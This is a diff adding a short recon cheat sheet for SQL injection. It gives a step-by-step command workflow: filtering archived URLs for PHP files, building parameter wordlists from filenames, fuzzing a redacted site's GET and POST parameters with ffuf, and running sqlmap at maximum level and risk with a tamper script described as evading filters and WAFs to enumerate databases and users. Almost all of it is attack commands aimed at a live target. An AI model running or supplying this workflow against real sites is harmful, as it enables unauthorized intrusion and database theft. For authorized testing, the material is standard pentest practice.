@@ -1,0 +1,35 @@
+sql recon!
+_________________________________________________
+
+1.cat wayback.txt| uro | grep -i ".php"|tee php-files.txt
+
+2. select only get urls so that we can escape duplicates
+
+cat php-files.txt| grep -i get | sed 's/.*.get//' | sort -u
+
+3. split out .php from filename
+cat  php_filename.txt | sort -u|cut -f1 -d "."|tee -a reductphp.txt 
+
+4. to split a word like AbCa to Ab Ca use this command
+sed 's/[A-Z]\+/\n&/g'
+
+5. upper to lower transform 
+cat reductphp.txt|sed 's/[A-Z]\+/\n&/g'|tr '[:upper:]' '[:lower:]'|tee -a reductphp.txt
+
+6. ffuf -w lowercase-parameters.txt -u "https://redacted.org/searchProgressCommitment.php?FUZZ=5"
+
+7. post
+ffuf -w lowercase-parameters.txt -X POST -d "FUZZ=5" -u "https://redacted.org/searchProgressCommitment.php"
+
+
+8. sqlmap 
+
+sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast
+
+
+--level 5 --> Level of tests to perform.
+--risk 3 --> Risk of tests to perform
+--dbms --> back-end DBMS value
+--no-cast --> to avoid use cast-alike statements during data fetching
+--tamber --> to evade filters and WAF’s
+"--hostname --current-user --current-db --dbs" --> to retrieve info about the database
